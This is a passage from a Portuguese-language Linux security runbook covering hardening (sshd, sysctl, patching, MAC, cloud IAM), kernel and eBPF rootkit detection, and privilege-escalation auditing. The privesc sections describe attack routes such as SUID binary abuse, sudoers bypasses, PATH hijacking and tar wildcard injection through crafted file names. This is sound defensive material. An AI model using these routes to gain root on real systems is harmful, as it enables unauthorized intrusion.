* Serviço interno faz `bind` em `127.0.0.1`, não em `0.0.0.0` (§15) — e a porta interna fecha no firewall da VPC (§12.6).

> Isto é o que derruba C2 por relay (GSocket, Tor, domain fronting), que **não** para bloqueando IP (§18.1): sem lista de saída permitida, não há IP para bloquear.

---

## 34.4. Identidade e credenciais

O raio de um vazamento é o raio da credencial vazada.

```text
uma identidade por serviço      → o comprometimento de um não move o outro
permissão mínima e escopada     → sem role ampla de projeto/conta na service-account da VM
credencial de vida curta        → token que expira vale menos que .env eterno
secret manager, não .env        → busca em runtime, com audit de acesso e rotação
conta de serviço SEM shell      → /usr/sbin/nologin (§7.9)
home da app sem escrita         → sem ~/.ssh, sem ~/.config graváveis (mata §7.3/§7.5/§7.6)
```

```bash
sudo usermod -s /usr/sbin/nologin app
sudo chown root:root /home/app && sudo chmod 755 /home/app     # app não escreve no próprio home
```

> A pergunta de teste: *"se o token desta VM vazar agora, o que ele abre?"*. Se a resposta for "o projeto inteiro", o blast radius é o projeto inteiro — e nenhum hardening no host muda isso.

---

## 34.5. Segmentação e acesso

```text
um serviço por host             → o RCE não alcança o banco que roda ao lado
firewall ENTRE tiers na VPC     → :22, :3306, :6379 não abertos host-a-host (§12.6)
SSH só via bastion              → ProxyJump; nada de porta 22 exposta em cada VM
chave por pessoa/host           → chave compartilhada = lateral de graça
sem ForwardAgent (-A)           → use ProxyJump: o agente encaminhado é pivô pronto (§12.1)
```

```bash
# ~/.ssh/config — no SEU cliente
Host bastion
  ForwardAgent no
Host app-*
  ProxyJump bastion
  ForwardAgent no
```

---

## 34.6. Tempo: hosts descartáveis

A dimensão que quase todo mundo esquece — e a mais eficaz contra persistência.

```text
deploy por imagem, não por SSH   → mudança feita à mão no host é anomalia detectável
redeploy periódico               → o host morre em dias; a persistência da §7 morre junto
root filesystem read-only        → não há onde plantar
sem SSH em produção              → sem shell interativo, o §13 fica vazio de propósito
```

> Um host que vive 7 dias limita o *dwell time* a 7 dias, sem você precisar detectar nada. É a §27 (rebuild) transformada em rotina, e não em emergência.

---

## 34.7. Detecção que reduz raio

Detectar cedo é reduzir raio no eixo tempo. Ligue **antes** de precisar — e a cadência para manter isso vivo é a §40.1:

```text
auditd ligado com regras         §11    sem ele, o vetor fica sem prova
log enviado para fora na hora    §10.4  o atacante não apaga o que não está no host
FIM (Wazuh/OSSEC/AIDE)           §32    alerta em escrita em /etc, /usr/bin, authorized_keys
alerta de egress inesperado      §2     conexão de saída do usuário da app = alarme
baseline (hash, portas, SUID)    §24/25 sem "normal" registrado, tudo parece normal
```

```bash
sudo auditctl -w /etc/passwd -p wa -k id_change
sudo auditctl -w /root/.ssh -p wa -k ssh_keys
sudo auditctl -a always,exit -F arch=b64 -S execve -F auid>=1000 -k exec
# baseline enquanto o host está limpo — guarde FORA dele:
sudo ss -ltnp > baseline-ports.txt
sudo find / -xdev -perm -4000 -ls > baseline-suid.txt
sudo getcap -r / 2>/dev/null > baseline-caps.txt
hashdeep -r -c sha256 /usr/bin /bin /sbin > baseline-hashes.txt
```

---

## 34.8. Auditoria rápida do estado atual

Rode agora e veja seu raio real:

```bash
systemd-analyze security --no-pager | head -20        # serviços mais expostos, ordenados
sudo ss -ltnp | grep -vE '127\.0\.0\.1|::1'           # o que escuta além do localhost?
ps -eo user,comm --no-headers | sort -u | grep '^root' # o que roda como root sem precisar?
findmnt -o TARGET,OPTIONS /tmp /var/tmp /dev/shm      # noexec/nosuid estão lá?
awk -F: '$3>=1000 && $7!~/nologin|false/ {print $1,$7}' /etc/passwd   # contas com shell
sudo iptables -S OUTPUT | tail -5                     # existe política de egress?
sudo getcap -r / 2>/dev/null                          # capabilities soltas (§25)
sudo lynis audit system                               # relatório completo, com prioridade
```

---

## 34.9. Configuração base do host (sshd, sysctl, patch, MAC)

As §34.1–§34.8 tratam do serviço exposto. Esta trata do host embaixo dele: quatro controles que quase todo ambiente assume prontos e quase nenhum tem. Nenhum reduz raio tanto quanto a §34.1 ou a §34.3 — mas cada um **fecha uma rota inteira** que aparece no resto do runbook.

### sshd — a única porta que você abre de propósito

```ini
# /etc/ssh/sshd_config.d/99-hardening.conf   (Debian/Ubuntu e RHEL 9+ leem o .d)
PermitRootLogin no                 # root só via sudo — o log passa a ter nome (§12)
PasswordAuthentication no          # mata brute force e credential stuffing de vez
KbdInteractiveAuthentication no    # o outro caminho de senha (via PAM) — feche junto
AuthenticationMethods publickey    # explícito: nada além de chave
PermitEmptyPasswords no
AllowGroups ssh-users              # allowlist de quem entra (não "todo mundo do /etc/passwd")
AllowTcpForwarding no              # sem -L/-R/-D: tira o túnel da §12.2
AllowAgentForwarding no            # agente encaminhado é pivô pronto (§12.1, §34.5)
PermitTunnel no
X11Forwarding no
MaxAuthTries 3
LoginGraceTime 20
ClientAliveInterval 300
ClientAliveCountMax 2
LogLevel VERBOSE                   # registra o fingerprint da chave usada — atribuição no login (§12)
```

```bash
sudo sshd -t && sudo systemctl reload sshd    # SEMPRE valide antes do reload
sudo sshd -T | grep -Ei 'permitrootlogin|passwordauthentication|forwarding|allowgroups'
```

> **Não feche a porta com você do lado de fora:** mantenha a sessão atual aberta e teste o login novo em **outro** terminal antes de sair.

> **Duas ressalvas.** (1) `AllowTcpForwarding no` quebra `ProxyJump` — no **bastion** ele precisa ficar ligado (é o trabalho dele); feche nos hosts de app, que são o destino. (2) `AllowGroups` sem o grupo existente tranca todo mundo: `sudo groupadd ssh-users && sudo usermod -aG ssh-users <VOCÊ>` antes do reload.

Segundo fator, quando existir — só no bastion, já que a §34.5 funila tudo por ele:

```ini
AuthenticationMethods publickey,keyboard-interactive:pam   # chave + TOTP (pam_google_authenticator)
```

---

### sysctl — kernel e rede

```ini
# /etc/sysctl.d/99-hardening.conf
kernel.kptr_restrict=2              # não vaza endereço de kernel para o exploit (§36.6)
kernel.dmesg_restrict=1             # dmesg só root — corta recon e leak de offset
kernel.yama.ptrace_scope=1          # sem ptrace em processo irmão: mata dump/injeção (§3.10)
kernel.unprivileged_bpf_disabled=1  # sem eBPF por usuário comum (§35.4)
net.core.bpf_jit_harden=2
kernel.perf_event_paranoid=3
kernel.randomize_va_space=2         # ASLR completo (confira: costuma já vir 2)
fs.suid_dumpable=0                  # processo SUID não gera core legível (§25)
fs.protected_symlinks=1
fs.protected_hardlinks=1
fs.protected_fifos=2
fs.protected_regular=2              # os quatro matam a família symlink/TOCTOU em /tmp (§34.2)
net.ipv4.conf.all.rp_filter=1
net.ipv4.conf.all.accept_redirects=0
net.ipv4.conf.all.send_redirects=0
net.ipv4.conf.all.accept_source_route=0
net.ipv4.tcp_syncookies=1
```

```bash
sudo sysctl --system                                  # aplica e persiste no boot
sysctl -a --pattern 'kptr|ptrace_scope|protected_|randomize' 2>/dev/null   # o que vale AGORA
```

> `kernel.modules_disabled=1` **não** entra aqui: ele é irreversível sem reboot e precisa rodar depois que todos os módulos legítimos carregaram — está na §35.7, com o contexto de ordem de boot.

---

### Patch — é aqui que o vetor da §16 e da §36.6 fecha

```bash
# Debian/Ubuntu
sudo apt install unattended-upgrades && sudo dpkg-reconfigure -plow unattended-upgrades
grep -rn 'Allowed-Origins' -A5 /etc/apt/apt.conf.d/50unattended-upgrades   # security está habilitado?
# RHEL/CentOS/Rocky
sudo dnf install dnf-automatic && sudo systemctl enable --now dnf-automatic-install.timer
```

```bash
# o que está pendente AGORA
sudo apt list --upgradable 2>/dev/null | grep -i secur      # Debian/Ubuntu
sudo dnf updateinfo list security                            # RHEL
# reboot pendente (kernel novo instalado, kernel velho ainda rodando)
needs-restarting -r                                          # RHEL
[ -f /var/run/reboot-required ] && cat /var/run/reboot-required.pkgs   # Debian/Ubuntu
```

> **Patch sem reinício resolve metade.** A lib atualizada está em disco; o processo antigo continua em memória com a versão vulnerável. `needs-restarting -s` (RHEL) e `checkrestart` (pacote `debian-goodies`) listam quem precisa reiniciar. Livepatch/kpatch cobre o kernel sem reboot; para o resto do sistema, a §34.6 (redeploy por imagem) resolve melhor do que qualquer automação de patch dentro do host.

---

### MAC — SELinux / AppArmor

A sandbox da §34.1 é por unit e discricionária: quem edita a unit, remove a sandbox. MAC é política do **sistema**, e continua valendo para um processo que já virou root.

```bash
getenforce && sudo sestatus                # RHEL: Enforcing | Permissive | Disabled
sudo ausearch -m avc -ts recent            # o que foi negado (e o que quebraria se ligar)
sudo semanage port -l | grep -w http_port_t   # a porta é permitida para o tipo do serviço?

aa-status                                  # Debian/Ubuntu: perfis carregados e em enforce
sudo aa-complain /usr/sbin/nginx           # aprende primeiro...
sudo aa-logprof                            # ...gera o perfil a partir do observado...
sudo aa-enforce /usr/sbin/nginx            # ...e só então trava
```

```text
Enforcing / enforce     política valendo                    ← o alvo
Permissive / complain   só registra a negação               ← use para medir antes de ligar
Disabled / sem perfil   desligado                           ← o estado real da maioria dos hosts
```

> **Ligar MAC do zero num host que já roda dá trabalho; ligar na imagem base (§34.6) é barato.** Se `getenforce` diz `Disabled` — ou `aa-status` não mostra o serviço exposto em enforce — o único confinamento que existe é o da §34.1. Comece pelo que já tem perfil pronto na distro (nginx, sshd, o runtime da app) e pelo serviço exposto; o resto pode ficar em `Permissive` enquanto você lê os AVC.

---

### Verificação (o estado, em seis linhas)

```bash
sudo sshd -T | grep -Ec 'permitrootlogin no|passwordauthentication no'   # espera 2
sysctl -n kernel.yama.ptrace_scope kernel.kptr_restrict fs.protected_regular
systemctl is-enabled unattended-upgrades dnf-automatic-install.timer 2>/dev/null
needs-restarting -r 2>/dev/null || ls /var/run/reboot-required 2>/dev/null
getenforce 2>/dev/null || aa-status --enforced 2>/dev/null
sudo lastb | head                          # tentativas de senha falhando = a porta ainda aceita senha
```

---

## 34.10. A camada da cloud (agnóstico de provedor)

A VM é o andar de baixo. Dois movimentos mudam o raio sem tocar no código da app: **tirar a borda do host** e tratar o **plano de controle** como o que ele é.

### Empurre a proteção para a borda gerenciada

```text
Internet
   ↓
LB de camada 7 gerenciado     termina TLS, roteia por host/path
   ↓
WAF gerenciado                regras, rate limit, IP/geo
   ↓
filtro no datapath            validação da SUA app: schema, campo proibido, URL interna
   ↓
VM sem IP público             firewall: só o LB alcança a porta
```

Cada provedor dá nomes diferentes às três primeiras caixas, mas as peças são as mesmas — e o filtro do meio hoje roda **dentro do datapath do LB** (plugin WebAssembly ou chamada externa para um serviço seu), então não é preciso manter um par de VMs de proxy só para isso.

Por que isto é §34 e não arquitetura:

```text
a VM perde o IP público   → a superfície da §14 vira uma porta e uma origem
o log de acesso nasce fora do host → §0 e §10.4 de graça: root na VM não alcança
o filtro deixa de ser um host      → não há mais um proxy seu para comprometer (§15)
regra e bloqueio ficam versionados → você muda a defesa sem deploy da app legada
```

> **Os dois limites honestos** (mesma lógica das armadilhas da §15): o WAF inspeciona o corpo só até um limite de tamanho e não enxerga o que a app **faz** com o dado; e a porta do backend continua alcançável **de dentro da VPC** se você não fechar (§12.6). Borda gerenciada reduz a superfície externa — não substitui a §34.1 nem a §34.3.

### O plano de controle é o root de verdade

```text
comprometer a VM                → você tem a VM
comprometer a credencial de API → você tem tudo que ela alcança, sem tocar em host nenhum
```

Nada das §2–§36 enxerga o segundo caso: não há processo, arquivo ou conexão no host. O detector é o **audit do provedor** (§10.4) e a rota de entrada mais comum é o metadata (§10.5).

```text
snapshot / imagem     quem cria snapshot lê o disco INTEIRO sem precisar de RCE (§1)
bucket público        o vazamento mais comum da cloud não tem invasão nenhuma (§37)
chave de KMS          quem descriptografa não precisa do disco
role ampla na VM      papel de editor/admin numa credencial de instância = o projeto todo (§34.4)
chave estática        credencial de conta de serviço que não expira e não avisa quando é usada
```

```bash
# IP público onde não devia — a superfície da §14 começa aqui
gcloud compute instances list --format='table(name,networkInterfaces[0].accessConfigs[0].natIP)'
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress]' --output table
# snapshot/imagem compartilhada fora da conta = disco inteiro exposto
aws ec2 describe-snapshot-attribute --snapshot-id <SNAP> --attribute createVolumePermission
gcloud compute images get-iam-policy <IMAGE>
# a pergunta da §34.4, em comando: o que esta credencial abre?
aws iam list-attached-role-policies --role-name <ROLE>
gcloud projects get-iam-policy <PROJ> --flatten=bindings \
  --filter='bindings.members:serviceAccount' --format='table(bindings.role,bindings.members)'
```

### O que o provedor não faz por você

```text
provedor garante   infra física, hypervisor, disponibilidade do serviço gerenciado
você garante       quem pode o quê (IAM), o que está exposto, o que está logado,
                   o que roda dentro da VM, e o que a credencial dela alcança
```

> Todo incidente deste runbook acontece **do lado de cá** da linha. "Está na cloud" não move nenhum item da coluna de baixo para a de cima.

---

## O que NÃO reduz blast radius

```text
antivírus no host          assinatura não pega o que é feito sob medida (§32)
WAF só na borda            não vê o corpo da requisição nem a porta direta (§15)
senha forte de root        irrelevante se a entrada é RCE na app (§16)
"a porta está atrás do LB" ela responde direto dentro da VPC (§12.6)
fail2ban sozinho           trata brute force; não trata exploração na 1ª requisição
```

> O padrão: todos protegem a **entrada**. Blast radius é sobre o **depois** da entrada — é aí que a maioria dos ambientes não tem nada.

---

# 35. Comprometimento em nível de kernel

> **Por quê:** todo o resto deste runbook pergunta ao kernel ("quais processos existem?", "quais conexões?"). Se o **kernel** foi comprometido, todas as respostas são fornecidas pelo atacante. **Olhe para:** não o objeto escondido (você não vai vê-lo), mas a **incoerência** entre duas formas de perguntar a mesma coisa.

**O problema fundamental:** `ps`, `ss`, `ls`, `lsof` e até ler `/proc` são syscalls. Um rootkit de kernel intercepta a syscall e devolve a realidade editada. Não existe ferramenta *dentro* da caixa que seja imune — inclusive as da §32.

Daí três consequências práticas:

```text
1. ausência de sinal NÃO é prova de limpeza     (você está perguntando ao suspeito)
2. o que denuncia é a INCOERÊNCIA               (o rootkit mente numa via e esquece a outra)
3. a resposta confiável vem de FORA             (memória via hypervisor, rede a montante)
```

---

## 35.1. Antes de tudo: é kernel mesmo?

Quase toda suspeita de "rootkit de kernel" acaba sendo outra coisa. Descarte na ordem — é mais rápido e mais provável:

```text
1. LD_PRELOAD / ld.so.preload      §7.8   rootkit de USERLAND, muito mais comum
2. binário de sistema trocado      §24    'ls'/'ps' trojanizados, sem kernel envolvido
3. processo só camuflado           §3     nome forjado; /proc/<pid>/exe entrega
4. aí sim: kernel                  §35
```

> **Pré-requisito lógico:** carregar módulo exige **root** (`CAP_SYS_MODULE`), e explorar o kernel exige um LPE. Ou seja, rootkit de kernel é **segundo estágio** — só acontece depois que o atacante já era root. Se você não achou comprometimento de root (§7.9, §25), a hipótese de kernel é fraca. Se achou, ela é obrigatória.

---

## 35.2. Taint e módulos

O kernel registra permanentemente quando algo "sujo" foi carregado:

```bash
T=$(cat /proc/sys/kernel/tainted); echo "tainted=$T"
for i in $(seq 0 18); do [ $(( (T>>i) & 1 )) -eq 1 ] && echo "  bit $i"; done
sudo dmesg | grep -iE 'taint|module verification failed|out-of-tree|lockdown'
```

Bits que importam aqui:

```text
bit 0  (1)     módulo proprietário
bit 1  (2)     módulo carregado à FORÇA (--force) ← anômalo
bit 3  (8)     módulo descarregado à força        ← anômalo
bit 12 (4096)  módulo out-of-tree (não veio do kernel da distro)
bit 13 (8192)  módulo NÃO ASSINADO               ← o mais relevante
bit 15 (32768) kernel live-patched
```

> **Falso positivo comum:** NVIDIA, VirtualBox, ZFS e qualquer DKMS sujam o kernel legitimamente (bits 0/12/13). O que interessa é `tainted != 0` **sem que você tenha instalado driver nenhum** — e o `dmesg` diz o **nome** do módulo que sujou.

Módulo escondido do `lsmod` mas presente no `/sys`:

```bash
for m in /sys/module/*/; do
  n=$(basename "$m")
  [ -f "$m/initstate" ] && ! lsmod | grep -q "^$n " && echo "OCULTO? $n"
done
```

Módulo carregado sem arquivo correspondente em disco:

```bash
for m in $(lsmod | awk 'NR>1{print $1}'); do
  modinfo -F filename "$m" 2>/dev/null | grep -q '^/' || echo "SEM ARQUIVO EM DISCO: $m"
done
```

> `initstate` só existe em módulo **carregável** — built-in do kernel aparece em `/sys/module` sem ele, e por isso não gera ruído no teste acima. Um módulo ativo sem arquivo em disco significa que ele foi carregado e o arquivo apagado: mesma lógica da §3.14, um nível abaixo.

---

## 35.3. Hooks de função (syscall table, ftrace, kprobes)

Patch direto na syscall table é técnica antiga — hoje ela é read-only (`CONFIG_STRICT_KERNEL_RWX`). O rootkit moderno usa a infraestrutura de tracing do próprio kernel:

```bash
sudo cat /sys/kernel/debug/tracing/enabled_functions   # (ou /sys/kernel/tracing/...)
sudo cat /sys/kernel/debug/kprobes/list
sudo cat /sys/kernel/debug/kprobes/enabled
```

> **Como ler:** `enabled_functions` normalmente está **vazio** num host que não roda ferramenta de tracing. Cada linha lista a função hookada e o **callback** — se o callback aponta para um módulo que você não reconhece (ou para função sem nome), é hook ativo. Alvos favoritos: `getdents64` (esconder arquivo), `tcp4_seq_show` (esconder conexão), `kill` (comando mágico via sinal), `sys_read`.

Comparar o conjunto de símbolos com o do kernel instalado:

```bash
diff <(sudo awk '{print $3}' /proc/kallsyms | sort -u) \
     <(awk '{print $3}' /boot/System.map-$(uname -r) | sort -u) | head -40
```

> Compare **nomes**, não endereços: o KASLR desloca tudo por um offset a cada boot, então endereço diferente é normal. Símbolo que existe em `/proc/kallsyms` e não no `System.map` = código que entrou depois. E se todo endereço aparecer `0000000000000000`, é `kptr_restrict` (proteção normal), não rootkit.

---

## 35.4. eBPF: o rootkit sem módulo

O ponto cego atual. eBPF roda **dentro** do kernel, intercepta syscalls e tráfego, **não carrega módulo e não suja o `tainted`** — todos os testes da 35.2 passam limpos.

```bash
sudo bpftool prog show          # programas carregados: tipo, nome, PID que carregou
sudo bpftool link show          # ANEXOS ativos (kprobe/tracepoint/lsm/xdp/tc)
sudo bpftool map show           # mapas — onde o rootkit guarda o que esconder
sudo ls -la /sys/fs/bpf/        # objetos "pinados" = persistência (some da §7!)
sudo bpftool prog dump xlated id <ID>    # o que o programa realmente faz
```

> **Sinais:** programa `kprobe`/`tracepoint`/`lsm` que você não carregou; programa cujo `pid` carregador não existe mais (foi carregado e o processo saiu — o hook fica); objeto pinado em `/sys/fs/bpf` sem dono conhecido; programa `xdp`/`tc` numa interface, que pode filtrar pacote **antes** do `tcpdump` ver.

> **Consequência importante:** se há eBPF hostil em `xdp`/`tc`, até a §2.6 mente — o pacote é escondido antes da captura. Aí só a captura **fora da VM** (VPC Flow, espelhamento) vale.

---

## 35.5. Método da divergência

O princípio geral: pergunte a mesma coisa por **dois caminhos diferentes**. O rootkit mantém a mentira coerente numa via e esquece a outra.

```bash
# processos: /proc x ps
ls -d /proc/[0-9]* 2>/dev/null | wc -l ; ps -e --no-headers | wc -l

# diretórios escondidos: link count do diretório = 2 + nº de subdiretórios
stat -c '%h %n' /etc ; ls -d /etc/*/ 2>/dev/null | wc -l

# espaço "sumido": df (superbloco) x du (percorre entradas)
df -h / ; du -shx / 2>/dev/null

# rede: conexão que o ss não mostra mas o pacote sai
sudo ss -tnp state established ; sudo tcpdump -ni any -c 200 'not port 22'

# ferramentas que já fazem isso
sudo unhide quick ; sudo unhide-tcp ; sudo unhide proc sys brute
```

> Cada divergência tem explicação inocente possível (processo nasceu entre os dois comandos, `du` sem permissão, tráfego de terceiro). O que vale é a **divergência que persiste e é grande** — 30 PIDs de diferença não é corrida de tempo.

> Vale também a via "binário que não passa pela libc": `busybox` e binário estático furam LD_PRELOAD (§7.8), mas **não** furam rootkit de kernel — se `busybox ls` e `ls` concordam e ainda assim há divergência de `du`/`df`, o problema está abaixo da libc.

---

## 35.6. A resposta confiável está fora da caixa

É aqui que **VM ajuda**: o hypervisor enxerga a memória sem pedir licença ao kernel convidado.

```bash
# 1) snapshot / dump de memória SEM confiar no host (§1, §32)
gcloud compute disks snapshot <DISK> --snapshot-names="ir-kernel"     # disco
sudo ./avml /evidence/mem.lime                                        # memória

# 2) analisar OFFLINE — plugins de rootkit do Volatility 3
vol -f mem.lime linux.check_syscall.Check_syscall     # entrada da syscall table desviada
vol -f mem.lime linux.check_modules.Check_modules     # módulo na lista interna x /proc/modules
vol -f mem.lime linux.hidden_modules.Hidden_modules   # varre a memória atrás de módulo oculto
vol -f mem.lime linux.check_afinfo.Check_afinfo       # operações de rede hookadas
vol -f mem.lime linux.check_creds.Check_creds         # processos compartilhando cred = root dado
vol -f mem.lime linux.malfind.Malfind
```

> **Por que funciona:** o Volatility lê a estrutura de dados do kernel diretamente do dump; ele não chama syscall, então não há como o rootkit mentir para ele. É a única categoria de verificação que não depende da boa-fé do suspeito. (Ver o *gotcha* do ISF na §32 — sem o símbolo do kernel exato, nada roda.)

Outras vantagens de fora:

```text
VPC Flow Logs / espelhamento   §10.4   o tráfego que o host esconde, a rede mostra
snapshot de disco montado RO   §32     fls/icat leem o filesystem sem o kernel comprometido
métricas do hypervisor                 CPU/rede que não batem com o que o host relata
```

---

## 35.7. Impedir (mais barato que detectar)

```bash
mokutil --sb-state                       # Secure Boot ligado?
cat /sys/kernel/security/lockdown        # [none] integrity confidentiality
sysctl kernel.modules_disabled kernel.unprivileged_bpf_disabled \
       kernel.kptr_restrict kernel.dmesg_restrict
```

```bash
# depois do boot, quando todos os módulos legítimos já carregaram (via sysctl/rc):
sudo sysctl -w kernel.modules_disabled=1        # NINGUÉM mais carrega módulo até o reboot
sudo sysctl -w kernel.unprivileged_bpf_disabled=1
sudo sysctl -w kernel.kptr_restrict=2 kernel.dmesg_restrict=1
```

> `kernel.modules_disabled=1` é **irreversível sem reboot** — é o controle mais forte e mais simples desta seção. Combine com Secure Boot + assinatura obrigatória de módulo, e a via "carregar rootkit" fecha; sobra só exploração de kernel, que é ordem de grandeza mais cara. Casa com a §34.1 (`ProtectKernelModules=yes`, `SystemCallFilter=~@module`).

---

## 35.8. Veredito

```text
tainted por módulo não assinado que você não instalou   → forte
módulo ativo sem arquivo em disco                       → forte
hook em getdents64/tcp4_seq_show apontando p/ módulo    → forte
eBPF kprobe/lsm sem dono, pinado em /sys/fs/bpf         → forte
divergência grande e estável entre duas visões          → forte
Volatility acusando syscall/módulo oculto no dump       → conclusivo
```

> **Confirmado kernel = rebuild (§27), sem discussão.** Não existe "remover rootkit de kernel": você não consegue verificar a remoção com ferramentas que rodam sobre o kernel removido. Faça snapshot (§1) para análise, levante substituto a partir de imagem confiável, rotacione tudo (§26) e trate os outros hosts como suspeitos (§23) — quem chegou a root aqui provavelmente chegou em mais lugares.

> **E o inverso:** todos os testes limparem **não** absolve o host. Significa apenas que, perguntando de dentro, nada apareceu. Se a suspeita nasceu de um sinal externo (tráfego que a rede vê e o host nega), o sinal externo vence.

---

# 36. Escalonamento de privilégio (privesc)

> **Por quê:** a §16 responde "o atacante consegue executar código como o usuário da app?". Esta responde a pergunta seguinte, que decide o tamanho do estrago: **"e desse usuário, ele vira root?"**. É a ponte entre o vetor (§14/§16) e o blast radius (§34). **Olhe para:** rotas, não exploits — você corrige a rota sem nunca explorá-la.

**Privesc não é infinito: são seis famílias de rota.** Auditar é percorrer as seis.

```text
1. binário com poder     SUID/SGID, capabilities            §36.2
2. delegação mal feita   sudo, polkit                       §36.3
3. permissão frouxa      arquivo/dir gravável que root usa  §36.4
4. grupo privilegiado    docker, lxd, disk, adm             §36.5
5. software desatualizado LPE de kernel, sudo, polkit, glibc §36.6
6. credencial reaproveitada  senha/chave em arquivo legível §12.3
```

> **Você não precisa explorar para corrigir.** Identificar a rota já basta para fechá-la — e explorar em produção é arriscado e ruidoso. Se for validar, faça numa cópia/staging e com autorização.

---

## 36.1. Varredura rápida

Rode **como o usuário que você quer avaliar** (tipicamente o da app), não como root — o objetivo é ver o que *ele* alcança:

```bash
id; groups
sudo -l 2>/dev/null                         # o que este usuário pode rodar como root

# binários com poder
sudo find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%m %u %g %p\n' 2>/dev/null
sudo getcap -r / 2>/dev/null

# gravável para mim, usado por root
echo "$PATH" | tr ':' '\n' | while read -r d; do [ -w "$d" ] && echo "PATH GRAVÁVEL: $d"; done
sudo find / -xdev -type d -perm -0002 ! -perm -1000 -ls 2>/dev/null    # dir world-writable SEM sticky
sudo find / -xdev -type f -perm -0002 ! -path '/proc/*' ! -path '/sys/*' -ls 2>/dev/null | head -40

# permissões de arquivos que definem privilégio
stat -c '%a %U:%G %n' /etc/passwd /etc/shadow /etc/sudoers /etc/ld.so.conf 2>/dev/null
ls -la /etc/ld.so.conf.d/ /etc/sudoers.d/ 2>/dev/null

# superfície de versão
uname -r; grep PRETTY /etc/os-release; sudo -V | head -1
```

---

## 36.2. SUID, SGID e capabilities

A enumeração está na §25 — aqui é **como interpretar**.

**Baseline esperado** num Linux comum (qualquer coisa fora disso merece pergunta):

```text
/usr/bin/{su,sudo,passwd,chsh,chfn,newgrp,gpasswd,mount,umount,pkexec,crontab,at}
/usr/lib/{openssh/ssh-keysign,dbus-1.0/dbus-daemon-launch-helper,polkit-1/polkit-agent-helper-1}
```

**A regra de decisão:** um binário SUID root é rota de privesc se ele conseguir fazer **uma** destas três coisas:

```text
executar comando arbitrário   → shell, editor, pager, interpretador, "!cmd", --exec
ler/escrever arquivo qualquer → lê /etc/shadow, escreve /etc/passwd ou uma unit
carregar código               → plugin, LD_*, módulo, biblioteca configurável
```

> Consulte **GTFOBins** para confirmar se aquele binário específico tem uma dessas primitivas — é a tabela de referência do assunto. Suspeitos clássicos aparecendo com SUID: `find`, `vim`, `nano`, `less`, `more`, `awk`, `python`, `perl`, `tar`, `cp`, `bash`, `env`, `nmap`, `docker`.

**Correção:**

```bash
sudo chmod u-s /caminho/do/binario          # remove SUID
sudo setcap -r /caminho/do/binario          # remove capabilities
```

Prevenção estrutural: `nosuid` nos mounts de escrita (§34.2) e `NoNewPrivileges=yes` + `CapabilityBoundingSet=` na unit (§34.1) — com isso o bit SUID deixa de valer para aquele serviço, mesmo que exista.

---

## 36.3. sudo

```bash
sudo -l                                     # como o próprio usuário
sudo -l -U <USER>                           # como root, avaliando outro usuário
sudo grep -RIn '' /etc/sudoers /etc/sudoers.d 2>/dev/null | grep -vE ':\s*#|^\s*$'
sudo visudo -c
```

O que é rota, na regra do sudoers:

```text
NOPASSWD para binário com shell/leitura     vim, less, awk, find, python, tar, git, systemctl
ALL=(ALL) ALL sem restrição de comando      é root com um passo a mais
curinga no argumento  (/bin/cat /var/log/*) traversal: ../../etc/shadow
comando por caminho RELATIVO                PATH hijack
env_keep com LD_PRELOAD / LD_LIBRARY_PATH   carrega lib do atacante como root
(ALL, !root) para "excluir" root            bypass conhecido (CVE-2019-14287)
sudo desatualizado                          Baron Samedit (CVE-2021-3156) e afins
```

**Correção:** comando sempre por **caminho absoluto**, sem curinga, `NOPASSWD` só para binário que não abre shell nem lê arquivo arbitrário, e no topo do sudoers:

```text
Defaults env_reset
Defaults secure_path="/usr/sbin:/usr/bin:/sbin:/bin"
Defaults use_pty
Defaults logfile=/var/log/sudo.log
```

> `use_pty` corta o sequestro do TTY por processo do mesmo usuário; `log_output`/`logfile` transforma sudo em evidência para a §11.

---

## 36.4. O que eu escrevo e root executa

**A rota mais comum na prática** — e a mais fácil de corrigir. Não é bug de software, é permissão.

```bash
# scripts citados em cron/systemd que meu usuário consegue escrever
sudo grep -RhoE '/[A-Za-z0-9_./-]+\.(sh|py|pl|rb)' \
  /etc/cron* /etc/systemd/system /usr/lib/systemd/system /etc/init.d 2>/dev/null \
  | sort -u | while read -r f; do [ -w "$f" ] && echo "GRAVÁVEL E RODA COMO ROOT: $f"; done

# a própria unit / o cron gravável
find /etc/systemd/system /etc/cron.d /etc/cron.daily -writable 2>/dev/null
# config do loader: lib carregada em TODO processo (§7.8)
find /etc/ld.so.conf.d /etc/ld.so.conf -writable 2>/dev/null
```

Duas variantes que passam despercebidas:

```text
PATH hijack       script de root chama 'tar'/'ps' sem caminho absoluto, e um diretório
                  gravável vem antes no PATH → você planta o binário com aquele nome
wildcard injection cron de root faz 'tar czf bkp.tgz *' num diretório que você escreve;
                  um arquivo com nome de flag (--checkpoint-action=...) vira argumento
```

**Correção:** dono `root:root` e modo `644`/`755` em tudo que root executa; caminho **absoluto** dentro dos scripts; `--` ou `./` explícito antes de curinga; diretório de trabalho de job de root nunca gravável por app.

---

## 36.5. Grupos que são root disfarçado

```bash
getent group docker lxd disk adm shadow sudo wheel video kvm 2>/dev/null
id <USER>
```

```text
docker / lxd   monta '/' do host num container → root imediato, sem exploit
disk           acesso cru ao dispositivo → lê e escreve o filesystem inteiro
shadow / adm   lê hashes de senha e logs
sudo / wheel   depende do sudoers (§36.3)
```

> Colocar alguém no grupo `docker` é **equivalente a dar root** — só que sem aparecer em nenhuma auditoria de sudoers. Se precisar, use socket rootless, `podman` sem daemon, ou uma regra sudo específica e auditada.

---

## 36.6. Kernel e componentes com LPE conhecida

```bash
uname -r; grep PRETTY /etc/os-release
sudo dnf updateinfo list security 2>/dev/null || \
  { sudo apt update -qq && apt list --upgradable 2>/dev/null | grep -ci security; }
sysctl kernel.unprivileged_userns_clone user.max_user_namespaces 2>/dev/null
```

Componentes onde LPE aparece com regularidade — vale checar versão contra o patch da distro:

```text
kernel   (overlayfs, nf_tables, io_uring, dirty pipe)
sudo     polkit/pkexec     glibc (ld.so)     systemd     dbus
```

> **Amplificador que quase ninguém desliga:** *user namespaces* sem privilégio. Boa parte das LPEs de kernel dos últimos anos precisa deles para alcançar a superfície vulnerável. Se nada no host usa container sem root:

```bash
sudo sysctl -w kernel.unprivileged_userns_clone=0     # Debian/Ubuntu
sudo sysctl -w user.max_user_namespaces=0             # genérico (cuidado: quebra podman/flatpak)
```

Outros `sysctl` que fecham primitivas usadas em privesc:

```bash
sudo sysctl -w kernel.yama.ptrace_scope=1     # processo não injeta em irmão do mesmo usuário
